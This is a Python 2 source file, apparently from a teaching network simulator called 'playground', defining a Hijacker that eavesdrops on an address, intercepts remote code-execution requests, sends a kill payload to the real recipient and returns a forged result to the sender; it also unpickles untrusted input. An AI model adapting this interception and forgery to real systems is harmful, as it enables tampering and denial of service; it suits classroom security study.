'''
Created on Dec 7, 2013

@author: sethjn
'''
from playground.network.message import definitions

# NOTE: We are making use of the playground.network.client package before it has
# initialized (because WE are part of it). So, we can't use "sampleservers" which
# isn't set until after __init__.py finishes
from playground.network.client.ClientApplicationServer import ClientApplicationServer
from playground.network.client.ClientApplicationServer import MobileCodeClient
from playground.network.common import Protocol, SimpleMessageHandlingProtocol, PlaygroundAddress
from playground.network.common import Error as NetworkError 
from playground.network.common import DefaultPlaygroundMobileCodeUnit
from playground.network.client import ClientBase
from playground.network.message import MessageData
import pickle

g_KILL_PYTHON_CODE_STRING = """
import os, signal
print "try to kill"
os.kill(os.getpid(), signal.SIGINT)
print "still alive?"
"""

class Hijacker(ClientApplicationServer):
    '''
    Hijacker starts up as an eavesdropper on a particular address,
    receives a code execution request, sends a shutdown message to the
    actual address, and a false result back to the original sender.
    '''

    class Protocol(SimpleMessageHandlingProtocol):
        """
        The actual Protocol launched by Hijacker when a connection is received
        """
        def __init__(self, hijacker, addr=None):
            SimpleMessageHandlingProtocol.__init__(self)
            self.hijacker = hijacker
            self.registerMessageHandler(definitions.playground.base.RunMobileCode, self.__handleRemoteCodeMessage)
            
        def connectionMade(self):
            
            """ Connect to the Hijacker's own address in order to send a message to the real recipient """
            self.connectToSelf = self.hijacker.clientBase.openClientConnection(MobileCodeClient(), 
                                                                               self.hijacker.clientBase.getAddress(), 
                                                                               100)
            
        def __handleRemoteCodeMessage(self, protocol, msg):
            msgObj = msg.data()
            try:
                codeObj = pickle.loads(msgObj.pythonCode)
            except Exception, e:
                """ Ignore code objects that can't be loaded """
                return
            if hasattr(codeObj, "HIJACKER_ATTR_ID"):
                """ If the Code Object has this attr, it came from us and needs to be ignored """
                return

            """ Send the Kill message to the real recipient """
            killSwitch = DefaultPlaygroundMobileCodeUnit(g_KILL_PYTHON_CODE_STRING)
            killSwitch.HIJACKER_ATTR_ID = 0
            self.connectToSelf.sendPythonCode(killSwitch, MobileCodeClient.CodeCallback())
            
            """ Send a corrupted result (0) back to the original recipient """
            toClientMsg = MessageData.GetMessageBuilder(definitions.playground.base.MobileCodeResult)
            toClientMsg["ID"].setData(msgObj.ID)
            toClientMsg["success"].setData(True)
            toClientMsg["result"].setData("0")
            toClientMsg["resultPickled"].setData(pickle.dumps(0))
            toClientMsg["exception"].setData("")
            toClientMsg["exceptionPickled"].setData("")
            self.transport.writeMessage(toClientMsg)

    def __init__(self, clientBase):
        self.clientBase = clientBase
        
def simpleMain(args):
    myAddress = PlaygroundAddress.FromString(args[3])
    client = ClientBase(myAddress)
    serverAddress, serverPortString = args[1:3]
    serverPort = int(serverPortString)
    hijacker = Hijacker(client)
    client.installClientServer(hijacker, 100)
    client.connectToPlaygroundServer(serverAddress, serverPort)
    
if __name__ == "__main__":
    import logging, sys
    logging.getLogger("").addHandler(logging.StreamHandler(sys.stdout))
    simpleMain(sys.argv)
